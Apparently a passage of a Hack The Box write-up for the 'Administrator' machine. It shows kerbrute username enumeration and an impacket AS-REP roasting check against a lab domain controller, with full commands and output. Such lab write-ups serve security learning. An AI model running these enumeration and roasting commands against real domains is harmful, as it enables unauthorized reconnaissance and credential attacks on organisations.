
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ ~/tools/kerbrute userenum --dc 10.129.203.207 -d administrator.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/01/25 - Ronnie Flathers @ropnop

2025/08/01 23:41:41 >  Using KDC(s):
2025/08/01 23:41:41 >   10.129.203.207:88

2025/08/01 23:41:41 >  [+] VALID USERNAME:       michael@administrator.htb
2025/08/01 23:41:41 >  [+] VALID USERNAME:       Michael@administrator.htb
2025/08/01 23:41:41 >  [+] VALID USERNAME:       benjamin@administrator.htb
2025/08/01 23:41:45 >  [+] VALID USERNAME:       administrator@administrator.htb
2025/08/01 23:41:46 >  [+] VALID USERNAME:       emily@administrator.htb
2025/08/01 23:41:46 >  [+] VALID USERNAME:       MICHAEL@administrator.htb
2025/08/01 23:41:47 >  [+] VALID USERNAME:       olivia@administrator.htb
2025/08/01 23:41:49 >  [+] VALID USERNAME:       Benjamin@administrator.htb
2025/08/01 23:41:52 >  [+] VALID USERNAME:       ethan@administrator.htb
2025/08/01 23:42:34 >  [+] VALID USERNAME:       Administrator@administrator.htb
2025/08/01 23:43:01 >  [+] VALID USERNAME:       BENJAMIN@administrator.htb
2025/08/01 23:43:34 >  [+] VALID USERNAME:       Emily@administrator.htb
2025/08/01 23:43:54 >  [+] VALID USERNAME:       Olivia@administrator.htb
2025/08/01 23:44:32 >  [+] VALID USERNAME:       Ethan@administrator.htb
2025/08/01 23:51:28 >  [+] VALID USERNAME:       OLIVIA@administrator.htb
```

We got five users:
michael
benjamin
emily
olivia
ethan
administrator


tried a quick no preauth check
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator]
└─$ impacket-GetNPUsers administrator.htb/ -usersfile usernames.txt -no-pass -dc-ip 10.129.203.207 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User benjamin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emily doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User olivia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ethan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

```